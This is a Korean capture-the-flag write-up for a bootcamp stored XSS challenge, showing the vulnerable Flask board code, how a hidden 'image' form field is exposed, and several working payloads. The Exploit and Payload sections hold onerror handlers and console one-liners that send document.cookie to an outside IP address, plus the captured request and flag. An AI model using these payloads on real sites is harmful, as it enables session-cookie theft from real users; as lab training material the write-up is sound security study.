---
title: "[Writeup] Knockon Bootcamp - 5. Xross Site Scripting revenge"
categories:
  - Web Hacking
tags:
  - Writeup
  - Knockon Bootcamp
  - Cross Site Scripting
  - Stored XSS
  - DOM based XSS
last_modified_at: 2024-09-03T10:40:00-05:00
published: true
---

|

## 문제

<http://war.knock-on.org:10012/>

![5. Xross Site Scripting revenge 1](/assets/images/writeup/web-hacking/knock-on/5_XSS_1.png)

![5. Xross Site Scripting revenge 2](/assets/images/writeup/web-hacking/knock-on/5_XSS_2.png)


|

|

|

### 목표

---

게시판에 악성 스크립트를 추가하여 쿠키 값 탈취하기

|

### 공격 기법

---

Cross Site Scripting

- Stored XSS
- DOM based XSS

|

|

|

## 문제 코드

```python
from flask import Flask, render_template, request, redirect, url_for, abort
from flask_sqlalchemy import SQLAlchemy
import secrets

import os
import requests

from selenium import webdriver
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.common.by import By

app = Flask(__name__)

MYSQL_DATABASE = os.getenv("MYSQL_DATABASE")
MYSQL_USER = os.getenv("MYSQL_USER")
MYSQL_PASSWORD = os.getenv("MYSQL_PASSWORD")
MYSQL_HOST = os.getenv("MYSQL_HOST")
SECRET_KEY = os.getenv("ADMIN_SECRET_KEY")
CHROMEDRIVER_PATH = os.getenv("CHROMEDRIVER_PATH")
localhost = "http://localhost:10006"

app.secret_key = SECRET_KEY
app.config["SQLALCHEMY_DATABASE_URI"] = (
    f"mysql+pymysql://{MYSQL_USER}:{MYSQL_PASSWORD}@{MYSQL_HOST}/{MYSQL_DATABASE}"
)
app.config["SQLALCHEMY_TRACK_MODIFICATIONS"] = False
db = SQLAlchemy(app)

class Post(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    password = db.Column(db.String(64), nullable=False)
    title = db.Column(db.String(64), nullable=False)
    content = db.Column(db.Text, nullable=False)
    image = db.Column(db.Text, nullable=True)

    def __repr__(self):
        return f"Post('{self.title}', '{self.content}')"

@app.route('/')
def index():
    posts = Post.query.all()
    return render_template('index.html', posts=posts)

@app.route('/write', methods=['GET', 'POST'])
def write():
    if request.method == 'POST':
        content = request.form['content']
        title = request.form['title']
        password = request.form['password']
        if len(password) < 4:
            return "비밀번호는 4자 이상이어야 합니다."
        if request.form['image']:
            post = Post(content=content, password=password, title=title, image=request.form['image'])
        else:
            post = Post(content=content, password=password, title=title)
        db.session.add(post)
        db.session.commit()
        return redirect(url_for('index'))
    return render_template('write.html')

@app.route('/post/<int:id>', methods=['GET', 'POST'])
def view_post(id):
    post = Post.query.get_or_404(id)

    if '127.0.0.1' == request.remote_addr: #if admin bot
        return render_template('post.html', post=post)
    
    if request.method == 'POST':

        password = request.form['password']
        if password == post.password :
            return render_template('post.html', post=post)
        else:
            return "비밀번호가 일치하지 않습니다."
    return render_template('view_post.html', post=post)

@app.route('/delete/<int:id>')
def delete_post(id):
    post = Post.query.get_or_404(id)
    db.session.delete(post)
    db.session.commit()
    return redirect(url_for('index'))

def read_url(url, cookie={"name": "name", "value": "value"}):
    driver = None
    try:
        service = Service(executable_path=CHROMEDRIVER_PATH)

        options = webdriver.ChromeOptions()
        options.add_argument("--headless")
        options.add_argument("--window-size=1920x1080")
        options.add_argument("--disable-gpu")
        options.add_argument("--no-sandbox")
        options.add_argument("--disable-dev-shm-usage")

        driver = webdriver.Chrome(service=service, options=options)

        driver.implicitly_wait(5)
        driver.set_page_load_timeout(10)

        driver.get(localhost)
        driver.add_cookie(cookie)
        driver.get(url)

    except Exception as e:
        if driver:
            driver.quit()
        return False
    finally:
        if driver:
            driver.quit()
        return True

@app.route("/admin/<int:post_id>", methods=["GET", "POST"])
def admin(post_id):
    target_url = localhost + f"/post/{post_id}"

    if requests.get(target_url).status_code == 404:
        message = f"Unvalid Post ID"
        posts = Post.query.all()
        return render_template("index.html", posts=posts, message=message)

    cookie = {"name": "cookie", "value": SECRET_KEY}
    success = read_url(target_url, cookie)

    if success:
        message = f"Bot activated successfully and visited: {target_url}"
    else:
        message = f"Bot activation failed: {target_url}"

    posts = Post.query.all()
    return render_template("index.html", posts=posts, message=message)

if __name__ == '__main__':
    app.run(host="0.0.0.0", port=10006, debug=True)
```

|

|

|

## 분석

### /write

---

![5. Xross Site Scripting revenge 3](/assets/images/writeup/web-hacking/knock-on/5_XSS_3.png)

`/write`에서 제목, 내용, 비밀번호 입력 가능

|

![5. Xross Site Scripting revenge 4](/assets/images/writeup/web-hacking/knock-on/5_XSS_4.png)

`내용`에 스크립트를 입력하면, 스크립트가 동작하지 않고 텍스트 그대로 화면에 나타남

|

```html
<input type="hidden" id="image" name="image" value="">
```

개발자 도구로 소스 코드를 확인하면 `<input>`태그가 `hidden`으로 숨겨져있음

|

|

|

## 코드 분석

### write()

---

```python
if request.form['image']:
    post = Post(content=content, password=password, title=title, image=request.form['image'])
```

`image` 라는 이름의 폼의 값이 존재하면 `Post`객체를 생성하고 `image`필드에 사용자가 입력한`request.form['image']` 추가

|

|

|

## Exploit

`/write` 에서 글을 작성할 때 `<input>`태그의 `value`를 채워야함

### 방법 1

```html
<input type="text" id="image" name="image" value="">
```

F12를 활용해 숨겨진 `<input>`태그의 `type`을 `hidden`에서 `text`로 변경하면 화면에 입력창이 나타남

|

```html
<img src="1" onerror=location.href="http://20.41.120.97:10010/"+document.cookie>
```

나타난 `<input>`입력창에 입력하면 됨

|

```html
<img src="<img src=" 1"="" onerror="location.href=&quot;http://20.41.120.97:10010/&quot;+document.cookie">
```

작성된 글의 소스코드를 보면 `src`가 이상하게 입력됐지만, 의도했던 `onerror`트리거는 정상적으로 동작함ㄷㄷ


|

```html
<svg src="" onerror=location.href="http://20.41.120.97:10010/"+document.cookie>
```

다른 태그여도 src속성과 트리거만 존재하면 가능

|

|

### 방법 2

---

```js
<input type="text" id="image" name="image" value="">
```

```js
document.getElementById('image').value = '<img src="123" onerror=location.href="http://20.41.120.97:10010/"+document.cookie>'

document.getElementById('image').value = `<img src="123" onerror=location.href="http://20.41.120.97:10010/"+document.cookie>`

document.getElementById('image').value = `<img src="123" onerror=location.href='http://20.41.120.97:10010/'+document.cookie>`

document.getElementById('image').value = `<img src="123" onerror="location.href='http://20.41.120.97:10010/'+document.cookie">`

document.getElementById('image').value = '<img src="123" onerror="location.href=\'http://20.41.120.97:10010/\'+document.cookie">'

document.getElementById('image').value = `"" onerror=location.href="http://20.41.120.97:10010/"+document.cookie>`
```

하나 골라서 console창에 입력

javascript를 사용해 `<input>`태그의 `value`속성의 값을 설정

게시글 내용은 중요하지 않음

|

|

### 결과

```sh
GET /cookie=K0%7Bt0day_is_3v3nt_d4y%7D HTTP/1.1
Host: 20.41.120.97:10010
Connection: keep-alive
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/126.0.6478.126 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://localhost:10006/
Accept-Encoding: gzip, deflate

```

|

|

|

## Payload

### console

---

```jsx
document.getElementById('image').value = `"" onerror=location.href="http://20.41.120.97:10010/"+document.cookie>`
```

|

|

### FLAG

---

```bash
K0{t0day_is_3v3nt_d4y}
```

|

---